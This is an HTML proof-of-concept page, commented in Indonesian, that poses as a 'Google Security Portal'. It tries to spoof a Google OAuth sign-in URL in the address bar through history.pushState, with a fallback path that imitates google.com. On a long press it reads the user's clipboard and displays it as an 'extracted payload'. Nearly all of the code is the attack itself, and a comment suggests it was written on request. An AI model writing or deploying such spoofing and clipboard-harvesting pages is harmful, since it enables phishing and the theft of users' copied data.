<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>History PushState & Origin Spoofing PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .info-box {
            margin-top: 25px;
            max-width: 320px;
            width: 100%;
            background: #ffffff;
            border: 1px solid #dadce0;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.08);
            font-size: 13px;
            color: #5f6368;
            word-break: break-all;
            display: none;
            text-align: left;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
        .pulse {
            color: #34a853;
            font-weight: bold;
            animation: blink 1.5s infinite;
        }
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>History PushState & Origin Context</h1>

    <!-- Target Link dengan Preview Page (target="_blank") -->
    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Origin Injection</a>

    <!-- Kotak Informasi Status -->
    <div class="info-box" id="infoBox">
        <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for interaction...</span><br>
        <div id="originDetails" style="margin-top: 8px;"></div>
    </div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        // 1. Inisialisasi manipulasi History State saat halaman dimuat
        try {
            // Memanipulasi history agar konteks seolah-olah berasal dari path/origin terpercaya
            const spoofedOriginUrl = "https://accounts.google.com/o/oauth2/auth/identifier";
            window.history.pushState({ originContext: "auth_secure_gateway" }, "Secure Gateway", spoofedOriginUrl);
        } catch (e) {
            // Browser memblokir cross-origin pushState, fallback ke relative/same-origin path spoofing
            window.history.pushState({ originContext: "auth_secure_gateway" }, "Secure Gateway", "/auth/verify/google.com");
        }

        // 2. Event listener utama berbasis long-press (contextmenu) dengan jeda waktu 3 detik
        document.addEventListener("contextmenu", async (e) => {
            const infoBox = document.getElementById("infoBox");
            const statusText = document.getElementById("statusText");
            const originDetails = document.getElementById("originDetails");

            infoBox.style.display = "block";
            statusText.className = "pulse";
            statusText.innerText = "Injecting history state & triggering payload...";

            setTimeout(async () => {
                try {
                    // Membaca konteks state history yang telah dimanipulasi
                    const currentState = history.state;
                    const currentUrl = window.location.href;

                    // Mengambil data Clipboard sebagai bentuk ekstraksi payload lanjutan
                    let extractedData = "No clipboard access";
                    if (navigator.clipboard && navigator.clipboard.readText) {
                        try {
                            extractedData = await navigator.clipboard.readText();
                        } catch (err) {
                            extractedData = "Restricted by browser policy";
                        }
                    }

                    statusText.className = "";
                    statusText.innerText = "Origin Context & Payload Executed!";
                    originDetails.innerHTML = `
                        <b>Current History URL:</b> ${currentUrl}<br>
                        <b>Injected State:</b> ${JSON.stringify(currentState)}<br>
                        <b>Extracted Clipboard:</b> <span style="color: #c5221f;">${extractedData}</span>
                    `;

                } catch (err) {
                    statusText.className = "";
                    statusText.innerText = `Execution error: ${err.message}`;
                }
            }, 3000); // Jeda 3 detik sesuai permintaan Anda
        });

        // 3. Menangkap event popstate untuk memantau perubahan state navigasi riwayat
        window.addEventListener("popstate", (event) => {
            console.debug("History state changed:", event.state);
        });
    </script>

</body>
</html>
